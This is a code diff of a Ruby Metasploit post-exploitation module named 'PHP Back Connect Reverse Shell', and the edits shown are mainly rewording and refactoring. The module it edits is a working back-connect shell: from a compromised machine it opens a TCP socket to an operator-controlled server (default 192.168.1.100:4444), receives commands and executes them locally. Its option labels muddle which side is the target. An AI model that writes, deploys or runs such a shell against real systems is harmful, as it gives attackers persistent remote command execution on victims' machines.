@@ -6,9 +6,7 @@ class MetasploitModule < Msf::Post
   def initialize(info = {})
     super(merge_info(info,
       'Name'        => 'PHP Back Connect Reverse Shell',
-      'Description' => %q{
-        This module connects back to a given PHP server and executes commands on the target system.
-      },
+      'Description' => 'This module connects to a PHP back connect server and executes commands on the remote target.',
       'License'     => MSF_LICENSE,
       'Author'      => ['Your Name'],
       'Platform'    => ['unix'],
@@ -20,8 +18,8 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptString.new('RHOST', [true, 'Target PHP server IP', '192.168.1.100']),
-        OptInt.new('RPORT', [true, 'Target PHP server port', 4444])
+        OptString.new('RHOST', [true, 'Target PHP back-connect IP', '192.168.1.100']),
+        OptInt.new('RPORT', [true, 'Target PHP back-connect Port', 4444])
       ]
     )
   end
@@ -29,15 +27,14 @@ class MetasploitModule < Msf::Post
   def run
     server = datastore['RHOST']
     port = datastore['RPORT']
-    
-    print_status("Connecting to PHP back connect server at #{server}:#{port}...")
-    
+
+    print_status("Connecting to PHP back-connect server at #{server}:#{port}...")
+
     begin
       socket = connect_to_target(server, port)
       print_good("Connected successfully.")
 
       while true
-        # Receive command from the attacker
         command = socket.gets.strip
 
         case command
@@ -45,7 +42,7 @@ class MetasploitModule < Msf::Post
           break
         when /^cd (.+)$/
           change_directory($1)
-        when 'hi' # Show current directory
+        when 'hi'
           socket.puts(current_directory)
         when 'uname -r'
           socket.puts(get_kernel_version)
@@ -65,12 +62,11 @@ class MetasploitModule < Msf::Post
 
       socket.close
     rescue => e
-      print_error("Failed to connect or run commands: #{e.message}")
+      print_error("Failed to connect or execute commands: #{e.message}")
     end
   end
 
   def connect_to_target(server, port)
-    # Create a TCP socket to the PHP server
     socket = Rex::Socket.create_tcp(
       'PeerHost' => server,
       'PeerPort' => port
@@ -83,11 +79,7 @@ class MetasploitModule < Msf::Post
   end
 
   def get_kernel_version
-    if `uname -r`.strip.empty?
-      'Unknown Kernel Version'
-    else
-      `uname -r`.strip
-    end
+    `uname -r`.strip.empty? ? "Unknown Kernel Version" : `uname -r`.strip
   end
 
   def list_directory_contents
